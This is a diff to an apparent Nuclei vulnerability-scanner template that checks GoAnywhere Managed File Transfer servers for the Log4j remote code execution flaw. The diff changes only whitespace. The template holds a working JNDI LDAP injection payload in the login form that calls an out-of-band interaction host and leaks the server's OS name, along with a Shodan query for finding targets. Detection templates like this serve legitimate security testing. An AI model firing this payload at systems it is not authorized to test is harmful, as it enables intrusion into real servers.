@@ -1,4 +1,5 @@
 id: goanywhere-mft-log4j-rce
+
 info:
   name: GoAnywhere Managed File Transfer -  Log4j Remote Code Execution
   author: pussycat0x
@@ -15,11 +16,13 @@ info:
     verified: true
     shodan-query: http.html:"GoAnywhere Managed File Transfer"
   tags: cve,cve2021,jndi,log4j,rce,oast,goanywhere
+
 requests:
   - raw:
       - |
         GET /goanywhere/auth/Login.xhtml HTTP/1.1
         Host: {{Hostname}}
+
       - |
         POST /goanywhere/auth/Login.xhtml HTTP/1.1
         Host: {{Hostname}}
@@ -28,17 +31,20 @@ requests:
         Referer: {{RootURL}}/goanywhere/auth/Login.xhtml
 
         formPanel%3AloginGrid%3Aname=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
+
     cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+        part: interactsh_protocol  # Confirms the DNS Interaction
         words:
           - "dns"
+
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+' # Match for extracted ${sys:os.name} variable
+          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+
     extractors:
       - type: regex
         name: view
@@ -47,11 +53,13 @@ requests:
         regex:
           - 'javax\.faces\.ViewState:1" value="(.*)" autocomplete'
         internal: true
+
       - type: kval
         kval:
           - interactsh_ip # Print remote interaction IP in output
+
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${sys:os.name} in output
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
